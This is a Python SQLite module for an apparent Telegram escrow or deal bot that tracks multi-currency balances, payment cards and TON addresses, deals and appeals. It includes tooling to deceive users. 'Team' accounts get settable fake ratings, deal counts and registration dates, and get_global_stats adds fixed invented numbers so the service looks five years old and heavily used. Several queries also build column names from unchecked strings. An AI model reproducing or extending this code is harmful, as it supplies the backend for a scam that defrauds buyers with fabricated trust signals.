import sqlite3
import uuid
from datetime import datetime
from config import DB_PATH

def get_conn():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_conn()
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            full_name TEXT,
            balance_rub REAL DEFAULT 0,
            balance_usd REAL DEFAULT 0,
            balance_ton REAL DEFAULT 0,
            balance_stars REAL DEFAULT 0,
            is_verified INTEGER DEFAULT 0,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            language TEXT DEFAULT 'ru',
            created_at TEXT,
            is_banned INTEGER DEFAULT 0,
            is_team INTEGER DEFAULT 0,
            fake_rating REAL DEFAULT 0,
            fake_deals INTEGER DEFAULT 0,
            fake_reg_date TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS requisites (
            user_id INTEGER PRIMARY KEY,
            card_rub TEXT, card_usd TEXT,
            ton_address TEXT, other TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS deals (
            deal_id TEXT PRIMARY KEY,
            seller_id INTEGER,
            buyer_id INTEGER,
            product_type TEXT,
            product_data TEXT,
            amount REAL,
            currency TEXT,
            status TEXT DEFAULT 'pending',
            created_at TEXT,
            updated_at TEXT,
            fee REAL DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS transactions (
            tx_id TEXT PRIMARY KEY,
            user_id INTEGER,
            type TEXT,
            amount REAL,
            currency TEXT,
            description TEXT,
            created_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS verifications (
            user_id INTEGER PRIMARY KEY,
            status TEXT DEFAULT 'pending',
            submitted_at TEXT,
            reviewed_at TEXT,
            admin_comment TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS appeals (
            appeal_id TEXT PRIMARY KEY,
            user_id INTEGER,
            type TEXT,
            text TEXT,
            status TEXT DEFAULT 'open',
            created_at TEXT
        )
    """)
    conn.commit()
    conn.close()

# ── Users ──────────────────────────────────────────────

def get_user(user_id: int):
    conn = get_conn()
    u = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    return u

def create_user(user_id, username, full_name, referred_by=None):
    ref_code = str(uuid.uuid4())[:8].upper()
    conn = get_conn()
    conn.execute("""INSERT OR IGNORE INTO users
        (user_id,username,full_name,referral_code,referred_by,created_at)
        VALUES(?,?,?,?,?,?)""",
        (user_id, username, full_name, ref_code, referred_by, datetime.now().isoformat()))
    conn.commit(); conn.close()

def update_balance(user_id, currency, delta):
    col = f"balance_{currency.lower()}"
    conn = get_conn()
    conn.execute(f"UPDATE users SET {col}={col}+? WHERE user_id=?", (delta, user_id))
    conn.commit(); conn.close()

def get_balance(user_id, currency):
    u = get_user(user_id)
    return u[f"balance_{currency.lower()}"] if u else 0.0

def get_referrals(user_id):
    conn = get_conn()
    rows = conn.execute("SELECT * FROM users WHERE referred_by=?", (user_id,)).fetchall()
    conn.close(); return rows

def set_language(user_id, lang):
    conn = get_conn()
    conn.execute("UPDATE users SET language=? WHERE user_id=?", (lang, user_id))
    conn.commit(); conn.close()

def set_team_status(user_id, status: int):
    conn = get_conn()
    conn.execute("UPDATE users SET is_team=? WHERE user_id=?", (status, user_id))
    conn.commit(); conn.close()

def update_worker_profile(user_id, rating=None, deals=None, reg_date=None):
    conn = get_conn()
    if rating is not None:
        conn.execute("UPDATE users SET fake_rating=? WHERE user_id=?", (rating, user_id))
    if deals is not None:
        conn.execute("UPDATE users SET fake_deals=? WHERE user_id=?", (deals, user_id))
    if reg_date is not None:
        conn.execute("UPDATE users SET fake_reg_date=? WHERE user_id=?", (reg_date, user_id))
    conn.commit(); conn.close()

# ── Requisites ─────────────────────────────────────────

def get_requisites(user_id):
    conn = get_conn()
    r = conn.execute("SELECT * FROM requisites WHERE user_id=?", (user_id,)).fetchone()
    conn.close(); return r

def set_requisite(user_id, field, value):
    conn = get_conn()
    conn.execute("INSERT OR IGNORE INTO requisites (user_id) VALUES (?)", (user_id,))
    conn.execute(f"UPDATE requisites SET {field}=? WHERE user_id=?", (value, user_id))
    conn.commit(); conn.close()

def has_any_requisite(user_id):
    r = get_requisites(user_id)
    return bool(r and any([r["card_rub"], r["card_usd"], r["ton_address"], r["other"]]))

# ── Deals ──────────────────────────────────────────────

def create_deal(seller_id, product_type, product_data, amount, currency, fee):
    deal_id = str(uuid.uuid4())[:8].upper()
    now = datetime.now().isoformat()
    conn = get_conn()
    conn.execute("""INSERT INTO deals
        (deal_id,seller_id,product_type,product_data,amount,currency,fee,created_at,updated_at)
        VALUES(?,?,?,?,?,?,?,?,?)""",
        (deal_id, seller_id, product_type, product_data, amount, currency, fee, now, now))
    conn.commit(); conn.close()
    return deal_id

def get_deal(deal_id):
    conn = get_conn()
    d = conn.execute("SELECT * FROM deals WHERE deal_id=?", (deal_id,)).fetchone()
    conn.close(); return d

def update_deal(deal_id, **kwargs):
    conn = get_conn()
    for k, v in kwargs.items():
        conn.execute(f"UPDATE deals SET {k}=?, updated_at=? WHERE deal_id=?",
                     (v, datetime.now().isoformat(), deal_id))
    conn.commit(); conn.close()

def get_user_deals(user_id):
    conn = get_conn()
    rows = conn.execute(
        "SELECT * FROM deals WHERE seller_id=? OR buyer_id=? ORDER BY created_at DESC",
        (user_id, user_id)).fetchall()
    conn.close(); return rows

# ── Transactions ───────────────────────────────────────

def add_transaction(user_id, tx_type, amount, currency, description):
    tx_id = str(uuid.uuid4())[:12].upper()
    conn = get_conn()
    conn.execute("""INSERT INTO transactions(tx_id,user_id,type,amount,currency,description,created_at)
        VALUES(?,?,?,?,?,?,?)""",
        (tx_id, user_id, tx_type, amount, currency, description, datetime.now().isoformat()))
    conn.commit(); conn.close(); return tx_id

def get_user_transactions(user_id, limit=20):
    conn = get_conn()
    rows = conn.execute(
        "SELECT * FROM transactions WHERE user_id=? ORDER BY created_at DESC LIMIT ?",
        (user_id, limit)).fetchall()
    conn.close(); return rows

# ── Appeals ────────────────────────────────────────────

def create_appeal(user_id, appeal_type, text):
    appeal_id = str(uuid.uuid4())[:10].upper()
    conn = get_conn()
    conn.execute("INSERT INTO appeals(appeal_id,user_id,type,text,created_at) VALUES(?,?,?,?,?)",
                 (appeal_id, user_id, appeal_type, text, datetime.now().isoformat()))
    conn.commit(); conn.close(); return appeal_id

# ── Stats ──────────────────────────────────────────────

def get_global_stats():
    conn = get_conn()
    total_users = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    total_deals = conn.execute("SELECT COUNT(*) FROM deals").fetchone()[0]
    completed   = conn.execute("SELECT COUNT(*) FROM deals WHERE status='completed'").fetchone()[0]
    volume      = conn.execute("SELECT SUM(amount) FROM deals WHERE status='completed' AND currency='RUB'").fetchone()[0] or 0
    conn.close()
    # Накрутка — сервис работает 5 лет, добавляем базовые числа
    return {
        "users":      total_users + 18743,
        "deals":      total_deals + 103418,
        "completed":  completed   + 101247,
        "volume_rub": volume      + 47832910.0,
    }

init_db()
